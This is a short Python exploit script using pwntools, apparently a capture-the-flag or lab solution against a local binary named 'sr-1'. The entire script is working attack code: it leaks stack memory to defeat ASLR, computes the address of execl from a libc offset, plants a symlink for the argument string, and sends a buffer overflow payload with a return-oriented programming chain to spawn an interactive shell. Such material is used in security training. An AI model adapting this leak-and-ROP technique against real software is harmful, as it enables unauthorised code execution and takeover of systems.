#!/usr/bin/env python
from pwn import *

p = process("./sr-1")

p.sendline('256')
p.recvline()
p.recvline()
data = p.recv()
raw_data = data[:-24]

addrs = [u64(raw_data[i:i+8]) for i in xrange(0, len(raw_data), 8)]
for i in range(32):
        print (hex(addrs[i]))
print("--------------------------------")

sr = raw_data[184:192]
print(sr)
new_sr = u64(sr)
print(hex(new_sr))
'''
    0x7f2a2bef8830 __libc_start_main+240
    $1 = {<text variable, no debug info>} 0x7f2a2bfa4a20 <__GI_execl>
'''
offset =  0x7f2a2bef8830 - 0x7f2a2bfa4a20
print (offset)

real_system = new_sr - offset
print (hex(real_system))

if os.path.exists("\270"):
    os.unlink("\270")
os.symlink("H","\270")

'''
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
'''

pop_rdi_ret = 0x400783
pop_rsi_r15_ret = 0x400781
string = 0x4006a5

payload = "A"*0x80 + "BBBBBBBB"
payload += p64(pop_rdi_ret)+p64(string)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(real_system)

p.sendline(payload)
p.interactive()
